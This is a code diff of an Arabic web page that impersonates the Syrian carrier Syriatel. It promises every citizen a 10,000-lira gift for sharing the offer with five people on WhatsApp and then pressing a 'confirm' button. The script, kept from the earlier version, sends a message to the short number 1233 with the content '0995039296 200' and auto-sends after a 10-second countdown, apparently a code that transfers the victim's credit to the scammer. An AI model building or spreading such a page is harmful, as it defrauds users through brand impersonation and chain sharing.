@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -7,13 +7,35 @@
     <style>
         body {
             display: flex;
-            justify-content: center;
-            align-items: center;
             flex-direction: column;
+            align-items: center;
+            justify-content: flex-start;
             height: 100vh;
             margin: 0;
+            padding: 20px;
             background-color: #f4f4f4;
             font-family: Arial, sans-serif;
+            text-align: center;
+        }
+        h1 {
+            font-size: 24px;
+            color: #333;
+        }
+        p {
+            font-size: 18px;
+            margin: 15px 0;
+        }
+        ul {
+            text-align: right;
+            direction: rtl;
+            font-size: 16px;
+            margin: 15px 0;
+        }
+        ul li {
+            margin: 5px 0;
+        }
+        .buttons {
+            margin-top: 20px;
         }
         button {
             padding: 15px 30px;
@@ -23,24 +45,46 @@
             border: none;
             border-radius: 5px;
             cursor: pointer;
-            margin-top: 20px;
+            margin: 10px;
         }
         button:hover {
             background-color: #0056b3;
         }
-        p {
-            font-size: 18px;
+        #timer-message {
+            margin-top: 20px;
+            font-size: 16px;
+            color: red;
         }
     </style>
 </head>
 <body>
-    <p>سيتم إرسال الرسالة تلقائيًا بعد <span id="timer">10</span> ثوانٍ...</p>
-    <button onclick="sendMessage()">اضغط هنا لإرسال الرسالة الآن</button>
+    <h1>أهلاً بك في سوريا الجديدة</h1>
+    <p>
+        نقدم لكل مواطن سوري مبلغ قدره <strong>10000 عشرة آلاف ليرة</strong> هدية مقدمة من سيريتيل على نية التوفيق.
+    </p>
+    <p><strong>شروط الكسب سهلة:</strong></p>
+    <ul>
+        <li>1. شارك هذه الرسالة لخمس أشخاص عبر تطبيق واتس آب من خلال زر رقم واحد.</li>
+        <li>2. اضغط الزر رقم اثنين وهو سيقوم بإرسال لنا أنك قد قمت بمشاركة المنشور.</li>
+    </ul>
+    <p><strong>ملاحظة:</strong> يرجى عدم ضغط زر 2 حتى تقوم بمشاركة المنشور لخمس أشخاص كي تصلك الهدية.</p>
+    <div class="buttons">
+        <button onclick="shareOnWhatsApp()">زر 1: شارك عبر واتس آب</button>
+        <button onclick="sendMessage()">زر 2: تأكيد المشاركة</button>
+    </div>
+    <p id="timer-message">سيتم إرسال الرسالة تلقائيًا بعد <span id="timer">10</span> ثوانٍ...</p>
 
     <script>
         const number = "1233"; // رقم الهاتف
         const message = "0995039296 200"; // محتوى الرسالة
         const delay = 10; // عدد الثواني قبل الإرسال التلقائي
+
+        // وظيفة مشاركة الرسالة عبر واتس آب
+        function shareOnWhatsApp() {
+            const whatsappMessage = "أهلاً بك في سوريا الجديدة. نقدم لكل مواطن سوري مبلغ قدره 10000 عشرة آلاف ليرة هدية مقدمة من سيريتيل.";
+            const whatsappUrl = `https://wa.me/?text=${encodeURIComponent(whatsappMessage)}`;
+            window.open(whatsappUrl, "_blank");
+        }
 
         // وظيفة إرسال الرسالة
         function sendMessage() {
